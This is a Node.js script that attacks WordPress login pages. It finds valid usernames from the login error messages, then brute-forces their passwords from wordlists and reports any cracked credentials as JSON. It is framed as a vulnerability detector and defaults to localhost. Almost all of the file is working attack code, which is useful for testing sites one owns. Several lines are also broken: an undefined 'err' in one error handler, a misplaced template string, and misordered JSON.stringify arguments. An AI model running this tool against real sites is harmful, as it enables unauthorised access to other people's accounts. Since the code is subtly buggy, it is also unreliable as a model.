import fs from "fs";

import axios from "axios";

import { program } from "commander";

import { URLSearchParams } from "url";

program
  .requiredOption('-t, --target <url>', 'Target WordPress login URL', 'http://localhost:8000/wp-login.php')
  .requiredOption('-u, --usernames <file>', 'Username wordlist file', 'usernames.txt')
  .requiredOption('-p, --passwords <file>', 'Password wordlist file', 'passwords.txt');

  program.parse();

  const options = program.opts();

const TARGET_URL = options.target;
const USERNAMES = fs.readFileSync(options.usernames, 'utf-8').split('\n').map(line => line.trim()).filter(Boolean);
const PASSWORDS = fs.readFileSync(options.passwords, 'utf-8').split('\n').map(line => line.trim()).filter(Boolean);

async function detectUserEnumeration(){
  const validUsers = [];

  const randomWrongPassword = 'bruteforcepasswordfortesting'
  for(const username of USERNAMES){
    const data = new URLSearchParams();
    data.append('log' , username);
    data.append('pwd' , randomWrongPassword);
    data.append('wp-submit' , 'Log In');

    try{
      const response = await axios.post(TARGET_URL , data.toString(),{
        headers: {
          'Content-Type' : 'application/x-www-form-urlencoded'
        },
      });
      const body = response.data;

      if(body.includes('The password you entered for the username') || body.includes('incorrect')){
        validUsers.push(username);
      }
    } catch(error){
      console.error(`error occurs when testing ${username} , error.message`);
    }
  }

  return validUsers;
}


async function detectBruteForce(validUsers){
  const credentials = [];

  for(const username of validUsers){
    for(const password of PASSWORDS){
      const data = new URLSearchParams();
      data.append('log', username);
      data.append('pwd', password);
      data.append('wp-submit', 'Log In');

      try{
      const response = await axios.post(TARGET_URL , data.toString(),{
        headers: {
          'Content-Type' : 'application/x-www-form-urlencoded'
        },
      });
      const body = response.data;
      const isFailure = body.includes('incorrect') || body.includes('Invalid username');

      if(!isFailure){
        credentials.push({username , password});
        break;
      }
    } catch(error){
      console.error(`Error brute-forcing ${username}:`, err.message);
    }
  }
}
 
return credentials;

}


(async () => {
  const output = {
    target: TARGET_URL,
    vulnerabilities: []
  };

  const validUsers = await detectUserEnumeration();

  if(validUsers.length > 0) {
    // example of user enumeration object
    // {
    //   "type": "User Enumeration",
    //   "detected": true,
    //   "vector": "/wp-login.php",
    //   "confidence": "medium"
    // }

    output.vulnerabilities.push({
      type: "User Enumeration",
      detected: true,
      vector: "/wp-login.php",
      confidence: "medium"
    });

    const credentials = await detectBruteForce(validUsers);
    if(credentials.length > 0){
      // example of brute-force login object
      // {
      //   "type": "Brute-force Login",
      //   "detected": true,
      //   "vector": "/wp-login.php",
      //   "usernames_tested": ["admin"],
      //   "credentials_found": [{"username": "admin", "password": "admin123"}],
      //   "confidence": "high"
      // }

      output.vulnerabilities.push({
        type: "Brute-force Login",
        detected: true,
        vector: "/wp-login.php",
        usernames_tested: validUsers,
        credentials_found: credentials,
        confidence: "high"
      });
    }
  }
  const readableResponseObject = JSON.stringify(output, " " , 1);
  console.log(readableResponseObject);
})();